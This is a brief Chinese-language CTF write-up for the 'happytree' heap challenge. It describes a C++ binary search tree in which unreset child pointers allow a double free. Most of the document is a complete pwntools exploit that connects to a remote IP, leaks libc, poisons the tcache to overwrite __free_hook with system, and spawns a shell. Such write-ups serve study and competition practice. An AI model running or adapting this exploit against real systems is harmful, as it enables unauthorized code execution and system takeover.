# happytree
C++实现的二叉搜索树，漏洞在create的的时候没有清空lchild和rchild，可造成double free
# 漏洞点
在插入二叉树的时候没有将插入节点的左右子树清空，也可以说是在删除节点的时候没有将左右子树清空导致二叉树中存在两个相同节点，导致double free
# exp
```python
# -*- coding: UTF-8 -*-
from base64 import b16decode, b32decode
from binascii import b2a_base64
from termios import B0, B75
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('124.71.147.225',9999 )
libc = ELF('./libc.so.6')
# io = process('happytree')
# libc = ELF('/home/xxx/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def insert(data,content):
	sl('1')
	sla('data: ',str(data))
	sa('content: ',str(content))
def delete(data):
	sl('2')
	sla('data: ',str(data))
	
def show(data):
	sl('3')
	sla('data: ',str(data))
	# sa('content:\n',content)
		
# def delete(idx):
# 	sl('4')
# 	sla('Index?\n',str(idx))
insert(0x40,"A")
for i in range(9):
	insert(0xb0+i,chr(0x60+i))
for i in range(8):
	delete(0xb0+i)
for i in range(7):
	insert(0xb6-i,chr(0x60+i))	
insert(0x99,'A')
show(0x99)
libcbase = l64() - 0x3ebd41
lg("libcbase")
system = libcbase + libc.symbols['system']
freehook = libcbase + libc.symbols['__free_hook']
lg('system')
lg('freehook')
insert(0x31,'A')
insert(0x30,'A')
insert(0x32,'A')
insert(0x33,'A')
delete(0x32)
insert(0x32,'A')
delete(0x32)
delete(0x33)
delete(0x30)
insert(0x28,p64(0x33))
delete(0x33)
# dbg() 
delete(0x28)
insert(0x20,p64(freehook-0x8))
insert(0x21,b'/bin/sh\x00'+p64(system))
delete(0x21)
irt()

                #                   40
				# 				    B0
				# 					  b1
				# 					    b2
				# 						  b3
				# 						    ..
				# 							  B7
				# 							    b8
				# 				 46
				# 			  39   B8
				# 			38 40 b6  
				# 			    b5  b7		    39
				# 			  b4  b6		  28 41
				# 		    b3  b5              40    
				# 		  b2  b4                  41 
				# 	    b1  b3
				# 	  b0  b2		    ..
				#   90  b1						  B7
				# 							    b8

```